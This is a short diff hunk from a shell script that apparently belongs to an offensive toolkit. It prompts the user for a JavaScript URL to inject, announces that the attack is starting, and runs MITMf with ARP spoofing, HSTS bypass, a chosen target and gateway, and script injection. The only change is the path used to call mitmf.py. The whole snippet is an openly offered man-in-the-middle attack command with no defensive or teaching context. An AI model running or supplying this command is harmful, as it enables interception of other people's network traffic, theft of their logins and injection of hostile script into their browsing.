@@ -8,4 +8,4 @@ echo
 read -p "Enter what your need inject: " js
 echo
 echo "[*]Your attack will be start wait a minute ....."
-./sniffer/mitmf.py --hsts --arp --spoof -i $interface --gateway $gateway --target $target --inject --js-url $js
+python /etc/SEF/tools/sniffer/mitmf.py --hsts --arp --spoof -i $interface --gateway $gateway --target $target --inject --js-url $js
